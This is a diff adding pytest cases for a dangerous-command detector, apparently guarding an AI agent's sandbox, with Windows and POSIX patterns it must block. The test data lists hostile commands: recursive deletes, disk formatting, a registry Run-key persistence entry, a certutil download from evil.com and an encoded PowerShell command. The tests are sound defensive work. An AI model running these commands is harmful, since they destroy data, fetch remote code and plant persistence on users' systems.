@@ -855,3 +855,41 @@ def test_sandbox_rooted_at_worktree_denies_parent_repo(tmp_path: Path, monkeypat
     assert not ok
     ok, _ = sandbox.check(str(wt / "file.txt"))
     assert ok
+
+
+# ---------------------------------------------------------------------------
+# F1.8 Windows 危险命令黑名单
+# ---------------------------------------------------------------------------
+
+class TestWindowsDangerousCommands:
+    """win32 专属危险模式：BYPASS/DONT_ASK 下唯一屏障，必须逐一命中。"""
+
+    @pytest.mark.parametrize("command", [
+        "rd /s /q C:\\project",
+        "del /f /s /q C:\\project\\*",
+        "format D:",
+        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc",
+        "certutil -urlcache -f http://evil.com/x.exe x.exe",
+        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue",
+    ])
+    def test_windows_patterns_hit(self, command: str):
+        detector = DangerousCommandDetector()
+        hit, reason = detector.detect(command)
+        assert hit, f"{command} must be denied: {reason}"
+
+    @pytest.mark.parametrize("command", [
+        "Remove-Item C:\\project\\build.log",
+        "del build.log",
+        "reg query HKLM\\Software",
+    ])
+    def test_benign_windows_commands_pass(self, command: str):
+        detector = DangerousCommandDetector()
+        hit, _ = detector.detect(command)
+        assert not hit, command
+
+    @pytest.mark.parametrize("command", ["rm -rf /", "rm -rf /home/x"])
+    def test_posix_patterns_still_hit(self, command: str):
+        detector = DangerousCommandDetector()
+        hit, _ = detector.detect(command)
+        assert hit, command
